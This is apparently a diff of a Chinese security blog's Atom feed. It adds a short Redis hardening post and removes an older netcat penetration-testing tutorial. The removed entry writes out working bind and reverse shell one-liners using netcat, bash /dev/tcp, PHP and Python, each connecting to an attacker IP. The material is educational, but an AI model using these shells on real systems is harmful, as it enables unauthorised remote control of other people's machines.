@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://bai-ren-1.github.io/"/>
-  <updated>2020-03-04T03:44:06.019Z</updated>
+  <updated>2020-03-04T05:51:21.450Z</updated>
   <id>http://bai-ren-1.github.io/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Redis安全配置</title>
+    <link href="http://bai-ren-1.github.io/2020/03/04/Redis%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
+    <id>http://bai-ren-1.github.io/2020/03/04/Redis%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</id>
+    <published>2020-03-04T05:37:57.000Z</published>
+    <updated>2020-03-04T05:51:21.450Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Redis安全配置"><a href="#Redis安全配置" class="headerlink" title="Redis安全配置"></a>Redis安全配置</h1><p>以下操作均在<code>redis.conf</code>中进行操作</p><h2 id="0x01-监听地址"><a href="#0x01-监听地址" class="headerlink" title="0x01 监听地址"></a>0x01 监听地址</h2><p>较新版本<code>redis</code>默认监听<code>环回地址(loopback)</code>，无需修改；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1 ::1</span><br></pre></td></tr></table></figure><h2 id="0x02-修改端口"><a href="#0x02-修改端口" class="headerlink" title="0x02 修改端口"></a>0x02 修改端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">port 6379</span><br></pre></td></tr></table></figure><p>6379为默认端口，可修改为自己需要的端口.</p><h2 id="0x03-添加密码"><a href="#0x03-添加密码" class="headerlink" title="0x03 添加密码"></a>0x03 添加密码</h2><p>添加如下语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass yourpassword</span><br></pre></td></tr></table></figure><h2 id="0x04-常规操作"><a href="#0x04-常规操作" class="headerlink" title="0x04 常规操作"></a>0x04 常规操作</h2><p>重启服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sudo /etc/init.d/redis-server restart</span><br></pre></td></tr></table></figure><p>查看<code>redis</code>运行状况:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p xxx #xxx为新设置端口</span><br><span class="line">127.0.0.1:xxx&gt; info</span><br></pre></td></tr></table></figure><p>查看<code>redis</code>进程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep redis</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;Redis安全配置&quot;&gt;&lt;a href=&quot;#Redis安全配置&quot; class=&quot;headerlink&quot; title=&quot;Redis安全配置&quot;&gt;&lt;/a&gt;Redis安全配置&lt;/h1&gt;&lt;p&gt;以下操作均在&lt;code&gt;redis.conf&lt;/code&gt;中进行操作&lt;/p&gt;
+&lt;h2
+      
+    
+    </summary>
+    
+    
+      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>Apache安全配置</title>
@@ -465,30 +490,6 @@
       
       
         &lt;h1 id=&quot;内网渗透工具之reGeorg-代理&quot;&gt;&lt;a href=&quot;#内网渗透工具之reGeorg-代理&quot; class=&quot;headerlink&quot; title=&quot;内网渗透工具之reGeorg+代理&quot;&gt;&lt;/a&gt;内网渗透工具之reGeorg+代理&lt;/h1&gt;&lt;p&gt;继续我们之前的学习，
-      
-    
-    </summary>
-    
-    
-      <category term="内网渗透" scheme="http://bai-ren-1.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>内网渗透工具之netcat</title>
-    <link href="http://bai-ren-1.github.io/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/"/>
-    <id>http://bai-ren-1.github.io/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/</id>
-    <published>2019-11-18T08:30:46.000Z</published>
-    <updated>2019-11-27T11:06:28.112Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="内网渗透工具总结之netcat"><a href="#内网渗透工具总结之netcat" class="headerlink" title="内网渗透工具总结之netcat"></a>内网渗透工具总结之netcat</h1><p>继续上一篇的思路，继续学习总结内网穿透的工具。这次这个工具是也是老牌的工具，誉为瑞士军刀。不多逼逼直接学习他的使用</p><h2 id="nc反弹服务器shell"><a href="#nc反弹服务器shell" class="headerlink" title="nc反弹服务器shell"></a>nc反弹服务器shell</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>操作目标机将cmd /Bash shell 绑定到它的特定端口8888，再让攻击机用简单的nc命令连接到8888端口，从而使用目标机的shell服务</p><p><img src="/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5.jpg" alt></p><p>假设攻击机的ip：ipA</p><p>假设目标机的ip：ipB（Windows/Linux）</p><ul><li><p>在目标机上设置监听端口：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span> -e <span class="built_in">cmd</span>.exe    [目标机为Windows]</span><br><span class="line">nc -lvp <span class="number">8888</span> -e /bin/sh    [目标机为Linux]</span><br><span class="line"></span><br><span class="line">（<span class="number">8888</span>是监听端口，可以更改为任意服务不冲突的端口）</span><br></pre></td></tr></table></figure></li><li><p>在攻击机上尝试连接：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 目标机的ip（ipB） <span class="number">8888</span></span><br></pre></td></tr></table></figure></li><li><p>连接成功之后就会在攻击机上得到远程目标机的shell</p></li></ul><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>攻击机监听它的特定端口8888，再操作目标机使用nc命令反向连接到8888端口，实现反弹shell</p><p><img src="/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5.jpg" alt></p><p>假设攻击机的ip：ipA</p><p>假设目标机的ip：ipB</p><ul><li>在攻击机上监听端口：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="number">8888</span>是监听端口，可以更改为任意服务不冲突的端口</span><br></pre></td></tr></table></figure><ul><li>在目标机上尝试反向连接：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc  攻击机的ip（ipA） <span class="number">8888</span>  -e <span class="built_in">cmd</span>.exe    [目标机为Windows]</span><br><span class="line">nc  攻击机的ip（ipA） <span class="number">8888</span>  -e /bin/sh    [目标机为Linux]</span><br></pre></td></tr></table></figure><ul><li>连接成功后会在攻击机上得到远程目标主机的shell</li></ul><h2 id="其他方式反弹shell-Linux服务器"><a href="#其他方式反弹shell-Linux服务器" class="headerlink" title="其他方式反弹shell(Linux服务器)"></a>其他方式反弹shell(Linux服务器)</h2><p>在上面反向连接中，需要目标机上装有netcat的服务，才能将服务器的shell反弹给攻击机。在很多时候，目标机上是没有该服务并且我们不能去上传或者下载到目标机上，那要如何让主机反弹shell呢？我们需要使用替代方法反向连接到攻击主机。</p><p>（注：下面无论哪种方式反弹shell都要先在自己的攻击机上开启端口监听，下面除了Bash反弹这个案例写了出来外，其他都默认用同样的方法在攻击机上用nc开启8888端口监听，然后我就不写出来了，特此说明（就是懒））</p><h3 id="Bash反向shell"><a href="#Bash反向shell" class="headerlink" title="Bash反向shell"></a>Bash反向shell</h3><p>同样在攻击机上监听8888端口等待服务器主动来反向连接</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span></span><br></pre></td></tr></table></figure><p>然后我们在目标机（Linux）的bash上执行下面的命令即可反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;＆/dev/tcp/192.168.100.113（攻击机ip）/4444 0&gt;＆1</span><br></pre></td></tr></table></figure><p>命令的解释：</p><ul><li>bash -i 是打开一个交互的bash </li><li>/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp</li><li>0&gt;&amp;1 将标准输入重定向到标准输出中 </li></ul><blockquote><p>​    附上Linux中的文件描述符</p><ol><li><p>标准输入  (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; </p></li><li><p>标准输出  (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; </p></li><li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;</p></li></ol></blockquote><ul><li>在此处不论是 “0&gt;&amp;1” 或者 “0&lt;&amp;1”  都是将标准输入重定向到标准输出中； “&gt;&amp;” 和 “&amp;&gt;” 也是同样效果；</li></ul><h3 id="PHP反向shell"><a href="#PHP反向shell" class="headerlink" title="PHP反向shell"></a>PHP反向shell</h3><p>适用于目标机上存在php服务，绝大多数服务器上都会是这种情况。我们在目标机上执行下面命令以反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock = fsockopen("192.168.100.113（攻击机ip）"，8888);exec("/bin/sh -i &lt;&amp;3&gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h3 id="Python反向shell"><a href="#Python反向shell" class="headerlink" title="Python反向shell"></a>Python反向shell</h3><p>python不多说了，几乎每台机器都有。在目标机上用一下命令反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.113",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p = subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure><p>还有更多的姿势会在后面补充。。。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;内网渗透工具总结之netcat&quot;&gt;&lt;a href=&quot;#内网渗透工具总结之netcat&quot; class=&quot;headerlink&quot; title=&quot;内网渗透工具总结之netcat&quot;&gt;&lt;/a&gt;内网渗透工具总结之netcat&lt;/h1&gt;&lt;p&gt;继续上一篇的思路，继续学习总结内网穿
       
     
     </summary>
